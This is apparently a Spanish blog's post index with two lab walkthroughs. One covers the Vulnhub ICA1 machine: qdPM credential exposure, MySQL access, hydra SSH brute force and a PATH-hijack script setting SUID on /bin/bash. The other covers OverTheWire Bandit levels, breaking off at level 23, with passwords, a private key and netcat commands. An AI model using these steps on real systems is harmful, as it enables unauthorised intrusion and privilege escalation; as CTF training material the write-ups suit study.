[
  
  {
    "title": "Máquina ICA1 - Vulnhub",
    "url": "/posts/Vulnhub-ICA1/",
    "categories": "Vulnhub",
    "tags": "MySQL, PathHijacking",
    "date": "2023-09-15 00:00:00 +0200",
    





    
    "snippet": "Link de la máquina:Según información de nuestra red de inteligencia, el ICA está trabajando en un proyecto secreto. Necesitamos saber cuál es el proyecto. Una vez que tengas los datos de acceso, en...",
    "content": "Link de la máquina:Según información de nuestra red de inteligencia, el ICA está trabajando en un proyecto secreto. Necesitamos saber cuál es el proyecto. Una vez que tengas los datos de acceso, envíanoslo. Colocaremos una puerta trasera para acceder al sistema más adelante. Simplemente concéntrate en cuál es el proyecto. Probablemente tendrñas que pasar por varias capas de seguridad. La Agencia tiene plena confianza en que completará con éxito esta misión.ReconocimientoUsaremos nmap para ver los puertos (servicios) abiertos y expuestos de la máquina, lo exportaremos en formato “Grepeable” al archivo allPorts:nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;IP&gt; -oG allPortsEste será el archivo resultante:# Nmap 7.93 scan initiated Mon Sep 11 17:00:31 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.28.121# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 192.168.28.121 ()\tStatus: UpHost: 192.168.28.121 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 33060/open/tcp//mysqlx///# Nmap done at Mon Sep 11 17:00:44 2023 -- 1 IP address (1 host up) scanned in 13.23 secondsComo vemos tenemos los puertos 22(SSH),80(HTTP),3306(MySQL),33060(MySQLx) expuestosMediante la utilidad extractPorts vamos a copiar todos los puertos a la clipboard y vamos a seguir con el reconocimiento:$ extractPorts allPorts[*] Extracting information...     [*] IP Address: 192.168.28.121    [*] Open ports: 22,80,3306,33060[*] Ports copied to clipboardY con nmap vamos a ver la versión de cada servicio expuesto en la máquina y lo exportaremos en formato Nmap al archivo targeted:nmap -sCV -p22,80,3306,33060 192.168.28.121 -oN targetedEnumeraciónCon la herramienta whatweb vamos a ver que tecnologías está utilizando la página web que está corriendon en el puerto 80❯ whatweb http://192.168.28.121http://192.168.28.121 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.28.121], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]Entre otras cosas, nos damos cuenta de que la página está usando qdPM (Es una herramienta de gestión de proyectos basada en web)(Imagen de la página web)ExplotaciónVemos que la versión de qdPM es la 9.2, con una pequeña búsqueda con searchsploit vemos que esa versión tiene registradas dos vulnerabilidades:$ searchsploit qdPM 9.2------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title                                                                                                                                        |  Path------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                          | php/webapps/50854.txtqdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                        | php/webapps/50176.txt------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsEn este caso vamos a elegir la segunda (Password Exposure), que permitirá descargarnos un archivo yml con la contraseña de acceso a la base de datos, la ruta es http://&lt;website&gt;/core/config/databases.yml$ cat databases.yml  all:  doctrine:    class: sfDoctrineDatabase    param:      dsn: 'mysql:dbname=qdpm;host=localhost'      profiler: false      username: qdpmadmin      password: \"&lt;?php echo urlencode('UcVQCMQk2STVeS6J') ; ?&gt;\"      attributes:        quote_identifier: true    Usuario: qdpmadminContraseña: UcVQCMQk2STVeS6JCon el siguiente comando accederemos a la base de datos$ mysql -uqdpmadmin -h &lt;IP&gt; -pUcVQCMQk2STVeS6JDentro encontraremos una base de datos llamada staff la cuál tiene tres tablas (department, login, user), ahí encontraremos las credenciales codificadas en base64Una vez tengamos una lista con los usuarios y las contraseñas usaremos la herramienta hydra para hacer fuerza bruta por SSH a la máquina víctima.$ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords$ hydra -L users -P passwords ssh://192.168.28.121Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-11 17:51:38[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task[DATA] attacking ssh://192.168.28.121:22/[22][ssh] host: 192.168.28.121   login: travis   password: DJceVy98W28Y7wLg[22][ssh] host: 192.168.28.121   login: dexter   password: 7ZwV4qtg42cmUXGX1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-11 17:51:44Ha encontrado nos usuarios los cuáles podemos acceder mediante SSH, travis y dexterEscalada de privilegiosCuando accedemos con el usuario dexter, encontramos esta nota:dexter@debian:~$ cat note.txt It seems to me that there is a weakness while accessing the system.As far as I know, the contents of executable files are partially viewable.I need to find out if there is a vulnerability or not.dexter@debian:~$ Mediante el comando find vamos a hacer una búsqueda para ver si hay ejecutables vulnerables en el sistema:dexter@debian:~$ find / -perm -4000 2&gt;/dev/null/opt/get_access/usr/bin/chfn/usr/bin/umount/usr/bin/gpasswd/usr/bin/sudo/usr/bin/passwd/usr/bin/newgrp/usr/bin/su/usr/bin/mount/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helperdexter@debian:~$Nos llama la atención el primer resultado, /opt/get_access, vamos a echarle un vistazoAl ejecutarlo nos sale esto:dexter@debian:~$ /opt/get_access   ############################  ########     ICA     #######  ### ACCESS TO THE SYSTEM ###  ############################  Server Information:   - Firewall:\tAIwall v9.5.2   - OS:\tDebian 11 \"bullseye\"   - Network:\tLocal Secure Network 2 (LSN2) v 2.4.1All services are disabled. Accessing to the system is allowed only within working hours.dexter@debian:~$Usaremos el comando strings para ver las cadenas de caracteres imprimibles que contenga el archivo /opt/get_access$ string /opt/get_access_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_cat /root/system.infoCould not create socket to access to the system.All services are disabled. Accessing to the system is allowed only within working hours.;*3$\"Nos llama la atención la línea en la que pone “cat /root/system.info” y sabemos que el ejecutable está usando el comando cat de forma relativa, lo que nos permite hacer una PATH HIJACKINGEl primer paso será dirigirnos a un directorio donde tengamos permisos de escritura (en mi caso /tmp y vamos a crear un ejecutable llamado cat)Contenido del script:#!/bin/bashchmod u+s /bin/bashEn él le estamos dando permiso SUID a /bin/bashAhora vamos a modificar el PATH de la siguiente forma:export PATH=/tmp:$PATHAñadiremos la ruta /tmp para que el sistema ejecute tome en cuanta los ejecutables de esa rutaSi volvemos a ejecutar /opt/get_access veremos lo siguiente:dexter@debian:/tmp$ /opt/get_access All services are disabled. Accessing to the system is allowed only within working hours.dexter@debian:/tmp$ ls -l /bin/bash-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bashdexter@debian:/tmp$Una vez /bin/bash tenga el permiso SUID, con el comando bash -p tendremos acceso al usuario rootdexter@debian:/tmp$ bash -pbash-5.1#Espero que te haya gustado esta primera máquina de Vulnhub llamada ICA1 :), !Nos vemos en la siguiente¡"
  },
  
  {
    "title": "OverTheWire - Bandit Walkthrough",
    "url": "/posts/OverTheWire-Bandit/",
    "categories": "OverTheWire",
    "tags": "OverTheWire, Bandit, CTF",
    "date": "2023-06-05 00:00:00 +0200",
    





    
    "snippet": "En este post vamos a realizar todos los niveles del CTF OverTheWire: bandit que actualmente van desde el 0 hasta el 33.Nivel 0:Para conectarnos a la máquina debemos conectarnos por SSH a la siguien...",
    "content": "En este post vamos a realizar todos los niveles del CTF OverTheWire: bandit que actualmente van desde el 0 hasta el 33.Nivel 0:Para conectarnos a la máquina debemos conectarnos por SSH a la siguiente direccion ‘bandit.labs.overthewire.org’ y mediante el usuario bandit0, contraseña bandit0 puerto 2220.ssh bandit0@bandit.labs.overthewire.org -p 2220Dentro encontraremos un fichero llamado readme el cuál contiene la password de bandit1bandit0@bandit:~$ cat readmeNH2SXQwcBdpmTEzi3bvBHMM9H66vVXjLNivel 1 -&gt; 2:Nos conectamos con la contraseña anterior a bandit1ssh bandit1@bandit.labs.overthewire.org -p 2220Como vemos existen un fichero llamado literalmente -, con el siguiente comando (hay otras formas de hacerlo) podremos ver su contenidobandit1@bandit:~$ ls -latotal 24-rw-r-----  1 bandit2 bandit1   33 Apr 23 18:04 -drwxr-xr-x  2 root    root    4096 Apr 23 18:04 .drwxr-xr-x 70 root    root    4096 Apr 23 18:05 ..-rw-r--r--  1 root    root     220 Jan  6  2022 .bash_logout-rw-r--r--  1 root    root    3771 Jan  6  2022 .bashrc-rw-r--r--  1 root    root     807 Jan  6  2022 .profilebandit1@bandit:~$ cat ./-rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgziNivel 2 -&gt; 3:Nos conectamos como usuario bandit2sshpass -p 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi' ssh bandit2@bandit.labs.overthewire.org -p 2220En el directorio personal de bandit2 se encuentra un fichero llamado “spaces in this file”bandit2@bandit:~$ cat spaces\\ in\\ this\\ filenameaBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiGSimplemente pulsando la tecla Tab se autocompletará el nombre del archivo, también podemos escribirlo entre comillas “spaces in this filename”bandit2@bandit:~$ cat \"spaces in this filename\"aBZ0W5EmUfAf7kHQeOwd8bauFJ2lAiGTNivel 3 -&gt; 4:Nos conectamos como usuario bandit3sshpass -p 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG' ssh bandit3@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en un fichero oculto dentro del directorio inhereCon el siguiente comando vamos a buscar todos los ficheros que hay en la carpeta personal, vamos a filtrar por resultados que no coincidan con “bashc | profile | logout” y vamos a hacer un cat de ese fichero con xargsbandit3@bandit:~$ find . -type f | grep -vE \"bashrc|profile|logout\" | xargs cat2EW7BBsr6aMMoJ2HjW067dm8EgX26xNeNivel 4 -&gt; 5:Nos conectamos como usuario bandit4sshpass -p '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe' ssh bandit4@bandit.labs.overthewire.org -p 2220La contraseña se encuentra en el único archivo legible por humanos en el directorio inherebandit4@bandit:~$ find . -type f -readable | grep \"\\-file\" | xargs file./inhere/-file03: data./inhere/-file06: data./inhere/-file08: data./inhere/-file07: ASCII text./inhere/-file04: data./inhere/-file00: data./inhere/-file01: data./inhere/-file02: data./inhere/-file09: Non-ISO extended-ASCII text, with no line terminators./inhere/-file05: dataNos damos cuenta de que el fichero -file07 es de tipo ASCII text, mostramos el contenido de ese ficherobandit4@bandit:~$ find . -type f -readable | grep \"\\-file\" | xargs file | grep \"ASCII text$\" | awk '{print $1}' FS=\":\" | xargs catlrIWWI6bB37kxfiCQZqUdOIYfr6eEeqRNivel 5 -&gt; 6:Nos conectamos como usuario bandit5sshpass -p 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR' ssh bandit5@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en un fichero dentro del directorio inhere y tiene las siguientes propiedades:  legible por humanos  1033 bytes de tamaño  No es ejecutableLo haremos con el siguiente comando:bandit5@bandit:~$ find . -type f -readable -size 1033c ! -executable | xargs cat | head -n 1P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJUNivel 6 -&gt; 7:Nos conectamos como usuario bandit6sshpass -p 'P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU' ssh bandit6@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en algún lugar del servidor y tiene las siguientes propiedades:  El usuario propietario es bandit7.  El grupo propietario es bandit6.  Tiene 33 bytes de tamaño.Lo haremos con el siguiente comando:bandit6@bandit:~$ find / -user bandit7 -group bandit6 2&gt;/dev/null | xargs catz7WtoNQU2XfjmMtWA8u5rN4vzqu4v99SNivel 7 -&gt; 8:Nos conectamos como usuario bandit7sshpass -p 'z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S' ssh bandit7@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero data.txt al lado de la palabra millionth.bandit7@bandit:~$ cat data.txt | grep millionth | awk 'NF{print $NF}'TESKZC0XvTetK0S9xNwm25STk5iWrBvPNivel 8 -&gt; 9:Nos conectamos como usuario bandit8sshpass -p 'TESKZC0XvTetK0S9xNwm25STk5iWrBvP' ssh bandit8@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero data.txt y está en la línea que ocurre una vez.bandit8@bandit:~$ sort data.txt | uniq -uEN632PlfYiZbn3PhVK3XOGSlNInNE00tNivel 9 -&gt; 10:Nos conectamos como usuario bandit9sshpass -p 'EN632PlfYiZbn3PhVK3XOGSlNInNE00t' ssh bandit9@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero data.txt en una de las pocas cadenas legibles, al lado de varios carateres ‘=’bandit9@bandit:~$ cat data.txt | grep -a === | tail -n 1 | awk 'NF{print $NF}'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6sNivel 10 -&gt; 11:Nos conectamos como usuario bandit10sshpass -p 'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s' ssh bandit10@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero data.txt, el cuál contiene texto codificado en base64.bandit10@bandit:~$ cat data.txt | base64 -dThe password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBMNivel 11 -&gt; 12:Nos conectamos como usuario bandit11sshpass -p '6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM' ssh bandit11@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el archivo data.txt, donde las letras se han girado 13 posiciones.bandit11@bandit:~$ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRvNivel 12 -&gt; 13:Nos conectamos como usuario bandit12sshpass -p 'JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv' ssh bandit12@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero data.txt, el cuál es un volcado hexadecimal de un archivo comprimido repetidamente.Primero, vamos a crear un directorio en/tmp, ya que nos tenemos permiso para modificar data.txt en el directorio actual, y vamos a copiar data.txt allí.bandit12@bandit:~$ mkdir /tmp/testr4f4bandit12@bandit:~$ cp data.txt /tmp/testr4f4bandit12@bandit:~$ cd /tmp/testr4f4bandit12@bandit:/tmp/testr4f4$ lsdata.txtVamos a pasar el volcado hexadecimal a un binario usando la opción -r del comando xxd y a colocarle la extensión .gzbandit12@bandit:/tmp/testr4f4$ xxd -r data.txt databandit12@bandit:/tmp/testr4f4$ file datadata: gzip compressed data, was \"data2.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581bandit12@bandit:/tmp/testr4f4$ mv data data.gzbandit12@bandit:/tmp/testr4f4$ lsdata.gz  data.txtUna vez que tengamos el archivo data.gz, a proseguir con el nivelDescomprimimos con el comando gzip el archivo data.gz:bandit12@bandit:/tmp/testr4f4$ gzip -d data.gzbandit12@bandit:/tmp/testr4f4$ lsdata  data.txtbandit12@bandit:/tmp/testr4f4$ file datadata: bzip2 compressed data, block size = 900kNos fijamos que el archivo que estaba dentro es un comprimido bzip2Renombramos el archivo data con extensión .bz2 y lo descomprimimos con la herramienta bzip2:bandit12@bandit:/tmp/testr4f4$ mv data data.bz2bandit12@bandit:/tmp/testr4f4$ bzip2 -d data.bz2bandit12@bandit:/tmp/testr4f4$ lsdata  data.txtbandit12@bandit:/tmp/testr4f4$ file datadata: gzip compressed data, was \"data4.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 20480El archivo resultante es un gzip, lo renombramos con extensión .gz y lo volvemos a descomprimir con gzip:bandit12@bandit:/tmp/testr4f4$ mv data data.gzbandit12@bandit:/tmp/testr4f4$ gzip -d data.gzbandit12@bandit:/tmp/testr4f4$ lsdata  data.txtbandit12@bandit:/tmp/testr4f4$ file datadata: POSIX tar archive (GNU)Ahora tenemos un archivo tar, renombramos con extensión .tar y descomprimimos con la herramienta tar:bandit12@bandit:/tmp/testr4f4$ mv data data.tarbandit12@bandit:/tmp/testr4f4$ tar xvf data.tardata5.binbandit12@bandit:/tmp/testr4f4$ lsdata5.bin  data.tar  data.txtbandit12@bandit:/tmp/testr4f4$ file data5.bindata5.bin: POSIX tar archive (GNU)Dentro se encuentra otro archivo .tar llamado data5.bin, renombramos y volvemos a descomprimir.bandit12@bandit:/tmp/testr4f4$ mv data5.bin data5.tarbandit12@bandit:/tmp/testr4f4$ tar xvf data5.tardata6.binbandit12@bandit:/tmp/testr4f4$ lsdata5.tar  data6.bin  data.tar  data.txtbandit12@bandit:/tmp/testr4f4$ file data6.bindata6.bin: bzip2 compressed data, block size = 900kDentro se encuentra un archivo bzip2, volvemos a renombrar y descomprimimos:bandit12@bandit:/tmp/testr4f4$ mv data6.bin data6.bz2bandit12@bandit:/tmp/testr4f4$ bzip2 -d data6.bz2bandit12@bandit:/tmp/testr4f4$ lsdata5.tar  data6  data.tar  data.txtbandit12@bandit:/tmp/testr4f4$ file data6data6: POSIX tar archive (GNU)Encontramos otro archivo tar llamado data6, renombramos y descomprimimos de nuevo:bandit12@bandit:/tmp/testr4f4$ mv data6 data6.tarbandit12@bandit:/tmp/testr4f4$ tar xvf data6.tardata8.binbandit12@bandit:/tmp/testr4f4$ file data8.bindata8.bin: gzip compressed data, was \"data9.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 49Dentro hay un archivo gzip (es el último) lo renombramos y descomprimimos:bandit12@bandit:/tmp/testr4f4$ mv data8.bin data8.gzbandit12@bandit:/tmp/testr4f4$ gzip -d data8.gzbandit12@bandit:/tmp/testr4f4$ lsdata5.tar  data6.tar  data8  data.tar  data.txtbandit12@bandit:/tmp/testr4f4$ file data8data8: ASCII textbandit12@bandit:/tmp/testr4f4$ cat data8The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDwNivel 13 -&gt; 14:Nos conectamos como usuario bandit13sshpass -p 'wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw' ssh bandit13@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se encuentra en el fichero etc/bandit_pass/bandit14 y puede ser leído por el usuario bandit14, no necesitamos conseguir la contraseña, pero si acceder al siguiente nivel con una clave privada SSH:bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220bandit14@bandit:~$ cat /etc/bandit_pass/bandit14fGrHPx402xGC7U7rXKDaxiWFTOiF0ENqNivel 14 -&gt; 15:Nos conectamos como usuario bandit14sshpass -p 'fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq' ssh bandit14@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se puede recuperar enviando la contraseña del nivel actual al puerto 30000 de la máquina localbandit14@bandit:~$ nc localhost 30000fGrHPx402xGC7U7rXKDaxiWFTOiF0ENqCorrect!jN2kgmIXJ6fShzhT2avhotn4Zcka6tntNivel 15 -&gt; 16:Nos conectamos como usuario bandit15sshpass -p 'jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt' ssh bandit15@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se puede recuperar enviando la contraseña del nivel actual al puerto 30001 de localhost usando la encriptación SSLbandit15@bandit:~$ ncat --ssl localhost 30001jN2kgmIXJ6fShzhT2avhotn4Zcka6tntCorrect!JQttfApK4SeyHwDlI9SXGR50qclOAil1Nivel 16 -&gt; 17:Nos conectamos como usuario bandit16sshpass -p 'JQttfApK4SeyHwDlI9SXGR50qclOAil1' ssh bandit16@bandit.labs.overthewire.org -p 2220La contraseña para el siguiente nivel se puede recupearr enviando la contraseña del nivel actual a un puerto del localhost entre el 31000 y el 32000bandit16@bandit:~$ ncat --ssl 127.0.0.1 31790JQttfApK4SeyHwDlI9SXGR50qclOAil1Correct!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----La respuesta es este texto que es una clave privada, la debemos de meter en un fichero de texto con extension private o rsa y con el siguiente comando nos conectamos como bandit17bandit16@bandit:/tmp/tmp.v3ynzMVtMe$ ssh -i key.rsa bandit17@localhost -p 2220Nivel 17 -&gt; 18:Nos conectamos como usuario bandit17Hay dos ficheros en el directorio Home llamados passwords.old y passwords.new. La contraseña se encuentra en passwords.new y es la única línea que ha sido cambianda entre los dos ficheros.Con el comando diff podemos ver que líneas han sido cambiadas entre dos ficheros:bandit17@bandit:~$ diff passwords.new passwords.old42c42&lt; hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg---&gt; glZreTEH1V3cGKL6g4conYqZqaEj0mtebandit17@bandit:~$Nivel 18 -&gt; 19:Nos conectamos como usuario bandit18sshpass -p 'hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg' ssh bandit18@bandit.labs.overthewire.org -p 2220Al conectarnos a bandit18 nos damos cuenta de que nos cierra la conexión, pero vemos un mensaje que dice Byebye!Entonces lo que debemos hacer será conectarnos a bandit18 pero enviar un comando durante la conexiónssh bandit18@bandit.labs.overthewire.org -p 2220 ls                      _                     _ _ _                     | |__   __ _ _ __   __| (_) |_                     | '_ \\ / _` | '_ \\ / _` | | __|                     | |_) | (_| | | | | (_| | | |_                     |_.__/ \\__,_|_| |_|\\__,_|_|\\__|\t\t     This is an OverTheWire game server.            More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password:readme Vemos que hay un archivo llamado readme, le haremos un catssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme                      _                     _ _ _                     | |__   __ _ _ __   __| (_) |_                     | '_ \\ / _` | '_ \\ / _` | | __|                     | |_) | (_| | | | | (_| | | |_                     |_.__/ \\__,_|_| |_|\\__,_|_|\\__|                   This is an OverTheWire game server.          More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password:awhqfNnAbc1naukrpqDYcF95h7HoMTrCNivel 19 -&gt; 20:Nos conectamos como usuario bandit19sshpass -p 'awhqfNnAbc1naukrpqDYcF95h7HoMTrC' ssh bandit19@bandit.labs.overthewire.org -p 2220Para ganar acceso al siguiente nivel, debes usar el binario setuid en el directorio Home. Ejecútalo sin argumentos para averiguar como se usa. La contraseña de este nivel se encuentra en un sitio usual (/etc/bandit_pass) después de que uses el binario setuidUsamos el binario de la siguiente forma:bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20VxCazJaVykI6W36BkBU0mJTCM8rR95XTbandit19@bandit:~$Nivel 20 -&gt; 21:Nos conectamos como usuario bandit20sshpass -p 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' ssh bandit20@bandit.labs.overthewire.org -p 2220Hay un binario setuid en el directorio Home que hace lo siguiente, crea una conexión hacia localhost en el puerto que le especifiques como argumento. Luego lee una línea de texto de la conexión y la compara con la contraseña de bandit20, si la contraseña es correcta, imprimirá la contraseña de bandit21En este nivel vamos a tener dos terminales abiertas con el usuario bandit21En una ejecutaremos el siguiente comando:bandit20@bandit:~$ nc -lvnp 4646Listening on 0.0.0.0 4646Se quedará esperando una conexiónEn la otra ventana ejecutaremos el siguiente comando:bandit20@bandit:~$ ./suconnect 4646Y si copiamos la contraseña de bandit20 en la ventana del primer comando nos saldrá esto:bandit20@bandit:~$ nc -lvnp 4646Listening on 0.0.0.0 4646Connection received on 127.0.0.1 59130VxCazJaVykI6W36BkBU0mJTCM8rR95XTNvEJF7oVjkddltPSrdKEFOllh9V1IBcqbandit20@bandit:~$Y esto en la otra ventana:bandit20@bandit:~$ ./suconnect 4646Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XTPassword matches, sending next passwordbandit20@bandit:~$Nivel 21 -&gt; 22:Nos conectamos como usuario bandit21sshpass -p 'NvEJF7oVjkddltPSrdKEFOllh9V1IBcq' ssh bandit21@bandit.labs.overthewire.org -p 2220Un programa está corriendo automáticamente en intervalos regulares con cron. Hecha un vistazo en /etc/cron.d/, mira la configuración y el comando que se está ejecutandobandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$Nos fijamos que está ejecutando un script llamado cronjob_bandit22.sh, veamos el contenido de ese script.bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$El script guarda la contraseña en un fichero en la carpeta /tmp, así que vamos a hacerle un cat a ese ficherobandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvWdDozAdTM2z9DiFEQ2mGlwngMfj4EZffbandit21@bandit:/etc/cron.d$Y nos muestra la contraseña de bandit22Nivel 22 -&gt; 23:Nos conectamos como usuario bandit22sshpass -p 'WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff' ssh bandit22@bandit.labs.overthewire.org -p 2220Este nivel es similar al anteriorbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$Esta tarea está ejecutando un script llamado cronjob_bandit23.shEl contenido del script:bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$El script simplemente lo que está haciendo es crear dos variables y una de ellas está encriptada, se averigua muy fácilbandit22@bandit:/usr/bin$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349QYw0Y2aiA672PsMmh9puTQuhoz8SyR2Gbandit22@bandit:/usr/bin$Nivel 23 -&gt; 24Nos 